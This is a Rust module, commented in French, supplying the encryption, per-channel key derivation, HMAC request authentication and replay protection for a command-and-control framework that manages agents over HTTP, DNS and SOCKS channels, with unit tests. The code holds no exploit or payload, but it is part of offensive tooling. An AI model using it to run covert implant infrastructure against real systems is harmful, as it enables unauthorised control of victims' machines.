//! DIAPILE C2 — Primitives cryptographiques partagées
//!
//! AES-256-GCM conforme BSI (nonce 96-bit aléatoire par message),
//! HMAC-SHA256 authentification mutuelle agent↔serveur,
//! cache anti-replay ±5 minutes.
//!
//! Architecture des clés (QW2 — OPSEC multi-canal) :
//!   Variable env `C2_MASTER_KEY` (ou alias rétro `C2_SHARED_KEY`) → 32 octets hex
//!     │
//!     ├─► HKDF-SHA256(info = "c2/http/channel-01")   ──► clé HTTP  (32B)
//!     ├─► HKDF-SHA256(info = "c2/dns/channel-02")    ──► clé DNS   (32B)
//!     ├─► HKDF-SHA256(info = "c2/socks/tunnel-03")   ──► clé SOCKS (32B)
//!     └─► HKDF-SHA256(info = "c2/report/ai-safe")    ──► clé report AI (32B)
//!
//! Chaque canal possède SA PROPRE clé dérivée : un leak sur un agent HTTP
//! ne compromet pas les autres canaux (DNS/SOCKS). Conforme doctrine
//! Shellter V2 / Cobalt Strike 4.x key-splitting.

#![allow(dead_code)]

use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use hkdf::Hkdf;
use hmac::{Hmac, Mac};
use sha2::{Digest, Sha256};
use std::collections::VecDeque;
use std::sync::Mutex;
use std::time::{Instant, SystemTime, UNIX_EPOCH};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum C2Channel {
    Http,
    Dns,
    Socks,
    AiReport,
    Custom(&'static str),
}

impl C2Channel {
    fn hkdf_info(self) -> &'static str {
        match self {
            C2Channel::Http => "c2/http/channel-01",
            C2Channel::Dns => "c2/dns/channel-02",
            C2Channel::Socks => "c2/socks/tunnel-03",
            C2Channel::AiReport => "c2/report/ai-safe",
            C2Channel::Custom(s) => s,
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            C2Channel::Http => "C2/HTTP",
            C2Channel::Dns => "C2/DNS",
            C2Channel::Socks => "C2/SOCKS",
            C2Channel::AiReport => "AI/REPORT",
            C2Channel::Custom(s) => s,
        }
    }
}

fn try_env_candidates(names: &[&str]) -> Option<String> {
    for name in names {
        if let Ok(v) = std::env::var(name) {
            if !v.trim().is_empty() {
                return Some(v);
            }
        }
    }
    None
}

/// Charge la CLÉ MAÎTRESSE 32-octets depuis l'environnement.
/// Cherche d'abord `C2_MASTER_KEY` (nouveau), fallback `C2_SHARED_KEY` (rétrocompat).
/// Format attendu : 64 caractères hex lowercase.
pub fn load_c2_master_key() -> Result<[u8; 32], Box<dyn std::error::Error + Send + Sync>> {
    let hex_val = try_env_candidates(&["C2_MASTER_KEY", "C2_SHARED_KEY"]).ok_or_else(|| {
        "C2_MASTER_KEY (alias C2_SHARED_KEY) 64-hex absente de l'environnement — C2 non disponible. \
         Exemple PowerShell : $env:C2_MASTER_KEY = (openssl rand -hex 32)"
    })?;
    let bytes = hex::decode(hex_val.trim())
        .map_err(|_| "C2_MASTER_KEY format hex invalide (attendu 64 chars hex)")?;
    if bytes.len() != 32 {
        return Err("C2_MASTER_KEY doit décoder en exactement 32 octets (64 hex)".into());
    }
    let mut out = [0u8; 32];
    out.copy_from_slice(&bytes);
    Ok(out)
}

/// (Rétrocompatibilité — alias `load_c2_master_key` pour les anciens appelants)
pub fn load_c2_shared_key() -> Result<[u8; 32], Box<dyn std::error::Error + Send + Sync>> {
    load_c2_master_key()
}

/// Dérive une clé de canal 32-octets via HKDF-SHA256 à partir de la clé maître.
/// Pas de salt (la clé maître est déjà 256-bit d'entropie forte), info = canal.
pub fn derive_channel_key(
    master: &[u8; 32],
    channel: C2Channel,
) -> Result<[u8; 32], Box<dyn std::error::Error + Send + Sync>> {
    let hk = Hkdf::<Sha256>::new(None, master);
    let mut out = [0u8; 32];
    hk.expand(channel.hkdf_info().as_bytes(), &mut out)
        .map_err(|e| format!("HKDF expand pour {} échoué: {:?}", channel.label(), e))?;
    Ok(out)
}

/// Convenience : charge la clé maître + dérive directement la clé du canal demandé.
/// Utilisé par les modules c2/http_c2.rs, c2/dns_c2.rs, pivot SOCKS.
pub fn load_channel_key(
    channel: C2Channel,
) -> Result<[u8; 32], Box<dyn std::error::Error + Send + Sync>> {
    let master = load_c2_master_key()?;
    derive_channel_key(&master, channel)
}

/// AES-256-GCM encrypt.
/// Wire format retourné : `[nonce 12B][ciphertext + tag 16B]`
pub fn aes_gcm_encrypt(
    key: &[u8; 32],
    plaintext: &[u8],
) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    let cipher = Aes256Gcm::new(key.into());
    let nonce_bytes: [u8; 12] = rand::random();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ct = cipher
        .encrypt(nonce, plaintext)
        .map_err(|e| format!("AES-GCM encrypt: {:?}", e))?;
    let mut out = Vec::with_capacity(12 + ct.len());
    out.extend_from_slice(&nonce_bytes);
    out.extend_from_slice(&ct);
    Ok(out)
}

/// AES-256-GCM decrypt.
/// Format entrée : `[nonce 12B][ciphertext + tag 16B]`
pub fn aes_gcm_decrypt(
    key: &[u8; 32],
    blob: &[u8],
) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    if blob.len() < 12 + 16 {
        return Err("AES blob trop petit (12B nonce + 16B tag minimum)".into());
    }
    let cipher = Aes256Gcm::new(key.into());
    let (nonce_bytes, ct) = blob.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);
    let pt = cipher
        .decrypt(nonce, ct)
        .map_err(|_| "AES-GCM decrypt: altération / clé incorrecte / nonce corrompu")?;
    Ok(pt)
}

/// Calcule HMAC-SHA256 lowercase-hex sur chaîne canonique C2 :
/// `METHOD\nPATH\nEPOCH_SECONDS_DEC\nSHA256HEX(BODY_CIPHERTEXT)`
// `Hmac::new_from_slice` accepte **toute** longueur de clé : la conversion ne
// peut jamais échouer (cf. doc `hmac`).
#[allow(clippy::expect_used)]
pub fn compute_hmac(
    key: &[u8; 32],
    method: &str,
    path: &str,
    ts_epoch: u64,
    body: &[u8],
) -> String {
    let body_sha = {
        let mut h = Sha256::new();
        h.update(body);
        hex::encode(h.finalize())
    };
    let msg = format!("{}\n{}\n{}\n{}", method, path, ts_epoch, body_sha);
    let mut mac = <Hmac<Sha256> as hmac::Mac>::new_from_slice(key)
        .expect("HMAC accepte toute longueur de clé");
    mac.update(msg.as_bytes());
    hex::encode(mac.finalize().into_bytes())
}

/// Cache anti-replay timestamps (±WINDOW secondes). Thread-safe via Mutex.
#[derive(Default)]
pub struct ReplayCache {
    inner: Mutex<VecDeque<(u64, Instant)>>,
}

impl ReplayCache {
    pub fn new() -> Self {
        Self::default()
    }

    pub const WINDOW_SECS: u64 = 300;
    const PURGE_EVERY: usize = 64;

    /// Retourne Ok(()) si timestamp frais, dans fenêtre, non-vu.
    /// Sinon Err((http_status, json_error_body)).
    pub fn accept(&self, ts: u64) -> Result<(), (u16, String)> {
        let now_epoch = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(ts);
        if now_epoch.abs_diff(ts) > Self::WINDOW_SECS {
            return Err((
                401,
                format!(
                    "{{\"error\":\"timestamp ±{}s hors fenêtre\",\"code\":401}}",
                    Self::WINDOW_SECS
                ),
            ));
        }
        let mut inner = self.inner.lock().map_err(|_| {
            (
                500,
                "{\"error\":\"replay cache lock poison\",\"code\":500}".to_string(),
            )
        })?;
        if inner.len() > Self::PURGE_EVERY {
            let cutoff = Instant::now() - std::time::Duration::from_secs(Self::WINDOW_SECS + 60);
            inner.retain(|(_, t)| *t > cutoff);
        }
        if inner.iter().any(|(t, _)| *t == ts) {
            return Err((
                401,
                "{\"error\":\"replay timestamp déjà vu\",\"code\":401}".to_string(),
            ));
        }
        inner.push_back((ts, Instant::now()));
        Ok(())
    }
}

/// Vérification complète requête C2 : headers + fenêtre + anti-replay + HMAC.
/// `body` ici = body brut reçu (déjà ciphertext).
pub fn verify_c2_request(
    cache: &ReplayCache,
    key: &[u8; 32],
    method: &str,
    path: &str,
    ts_str: Option<&str>,
    hmac_str: Option<&str>,
    body: &[u8],
) -> Result<(), (u16, String)> {
    let ts = ts_str.and_then(|s| s.parse::<u64>().ok()).ok_or_else(|| {
        (
            401,
            "{\"error\":\"X-C2-Timestamp absent/invalide\",\"code\":401}".to_string(),
        )
    })?;
    let hmac = hmac_str.ok_or_else(|| {
        (
            401,
            "{\"error\":\"X-C2-HMAC-SHA256 absent\",\"code\":401}".to_string(),
        )
    })?;
    cache.accept(ts)?;
    let expected = compute_hmac(key, method, path, ts, body);
    if !ct_eq_hex(&expected, hmac) {
        return Err((
            401,
            "{\"error\":\"HMAC mismatch\",\"code\":401}".to_string(),
        ));
    }
    Ok(())
}

/// Égalité temps-constant entre deux chaînes hex (même longueur obligatoire).
fn ct_eq_hex(a: &str, b: &str) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut diff = 0u8;
    for (x, y) in a.bytes().zip(b.bytes()) {
        diff |= x ^ y;
    }
    diff == 0
}

// ── Tests unitaires ──────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use rand::RngCore;

    fn random_key() -> [u8; 32] {
        let mut k = [0u8; 32];
        rand::thread_rng().fill_bytes(&mut k);
        k
    }

    #[test]
    fn c2_aes_roundtrip() {
        let k = random_key();
        let pt = br#"{"id":"a1b2c3","hostname":"victim01","ok":true,"arr":[1,2,3]}"#;
        let blob = aes_gcm_encrypt(&k, pt).expect("encrypt");
        // Roundtrip OK
        let pt2 = aes_gcm_decrypt(&k, &blob).expect("decrypt");
        assert_eq!(pt.as_slice(), &pt2[..]);
        // Altération 1 octet ciphertext → échec
        let mut bad = blob.clone();
        let n = bad.len();
        bad[n / 2] ^= 0x80;
        assert!(
            aes_gcm_decrypt(&k, &bad).is_err(),
            "blob altéré doit échouer"
        );
        // Clé voisine → échec
        let mut k2 = k;
        k2[0] ^= 0x01;
        assert!(
            aes_gcm_decrypt(&k2, &blob).is_err(),
            "clé fausse doit échouer"
        );
    }

    #[test]
    fn c2_hmac_valid_vs_invalid() {
        let k = random_key();
        let body = b"ci-pher-text-blob-0123456789abcdef";
        let ts = 1710000000u64;
        let good = compute_hmac(&k, "POST", "/checkin", ts, body);
        assert_eq!(good.len(), 64, "HMAC-SHA256 hex = 64 chars");
        // Mauvaise méthode → différent
        let other = compute_hmac(&k, "GET", "/checkin", ts, body);
        assert!(ct_eq_hex(&good, &good));
        assert!(!ct_eq_hex(&good, &other));
        // 1-bit flip → mismatch
        let mut bad = good.clone();
        let c: Vec<char> = bad.chars().collect();
        bad = c
            .iter()
            .enumerate()
            .map(|(i, ch)| {
                if i == 0 {
                    if *ch == '0' {
                        '1'
                    } else {
                        '0'
                    }
                } else {
                    *ch
                }
            })
            .collect();
        assert!(!ct_eq_hex(&good, &bad));
    }

    #[test]
    fn c2_timestamp_replay_check() {
        let cache = ReplayCache::new();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        // Timestamp frais → OK
        assert!(cache.accept(now).is_ok());
        // Double utilisation → Err (replay)
        assert!(cache.accept(now).is_err());
        // Trop vieux (1h) → Err
        assert!(cache.accept(now.saturating_sub(3600)).is_err());
        // Trop futuriste (1h) → Err
        assert!(cache.accept(now.saturating_add(3600)).is_err());
        // Nouveau ts dans fenêtre → OK
        assert!(cache.accept(now + 7).is_ok());
    }

    // ──────────────────────────────────────────────────────────────────────
    // QW2 — Tests HKDF-SHA256 dérivation multi-clé par canal
    // ──────────────────────────────────────────────────────────────────────
    use std::collections::HashSet;

    #[test]
    fn hkdf_channel_keys_are_distinct() {
        let master = [0x42u8; 32];
        let http = derive_channel_key(&master, C2Channel::Http).expect("derive HTTP");
        let dns = derive_channel_key(&master, C2Channel::Dns).expect("derive DNS");
        let socks = derive_channel_key(&master, C2Channel::Socks).expect("derive SOCKS");
        let ai = derive_channel_key(&master, C2Channel::AiReport).expect("derive AI");

        let mut set = HashSet::new();
        assert!(set.insert(http), "clé HTTP non unique");
        assert!(
            set.insert(dns),
            "clé DNS  identique à une autre (FAIL isolation)"
        );
        assert!(
            set.insert(socks),
            "clé SOCKS identique à une autre (FAIL isolation)"
        );
        assert!(
            set.insert(ai),
            "clé AI    identique à une autre (FAIL isolation)"
        );
        assert_eq!(set.len(), 4, "4 canaux → 4 clés distinctes");
        // master != toutes les clés dérivées → never expose master
        assert!(
            set.iter().all(|k| k != &master),
            "clé dérivée == master (FAIL KDF)"
        );
    }

    #[test]
    fn hkdf_derivation_is_deterministic() {
        let m = *b"0123456789ABCDEF0123456789ABCDEF";
        let a = derive_channel_key(&m, C2Channel::Http).unwrap();
        let b = derive_channel_key(&m, C2Channel::Http).unwrap();
        assert_eq!(a, b, "même master + même canal → clé déterministe");
        // info Custom distincte → clé distincte du canal Http (domain separation HKDF)
        let c = derive_channel_key(&m, C2Channel::Custom("operator/session-42")).unwrap();
        assert_ne!(a, c, "info Custom distincte → clé distincte du canal Http");
    }

    #[test]
    fn hkdf_custom_separates_operators() {
        let master = [0xAAu8; 32];
        let op_a =
            derive_channel_key(&master, C2Channel::Custom("operator/ALICE/session-01")).unwrap();
        let op_b =
            derive_channel_key(&master, C2Channel::Custom("operator/BOB/session-02")).unwrap();
        assert_ne!(
            op_a, op_b,
            "opérateurs différents → clés Custom différentes"
        );
    }

    #[test]
    fn hkdf_key_length_is_exactly_256_bits() {
        let m = random_key();
        let k = derive_channel_key(&m, C2Channel::Dns).unwrap();
        assert_eq!(k.len(), 32, "clé dérivée = 256 bits = 32 octets");
    }

    #[test]
    fn aes_gcm_with_derived_keys_roundtrip() {
        let m = random_key();
        let k_http = derive_channel_key(&m, C2Channel::Http).unwrap();
        let pt = b"agent-7f1a: beacon-ok { mem=42MB, pid=9124 }";
        let blob = aes_gcm_encrypt(&k_http, pt).unwrap();
        let dec = aes_gcm_decrypt(&k_http, &blob).unwrap();
        assert_eq!(
            &dec[..],
            &pt[..],
            "clé dérivée HTTP implémente AES-GCM correctement"
        );
        // clé DNS déchiffre PAS HTTP payload (isolation)
        let k_dns = derive_channel_key(&m, C2Channel::Dns).unwrap();
        assert!(
            aes_gcm_decrypt(&k_dns, &blob).is_err(),
            "clé DNS NE DOIT PAS décrypter payload HTTP (isolation FAIL)"
        );
    }
}
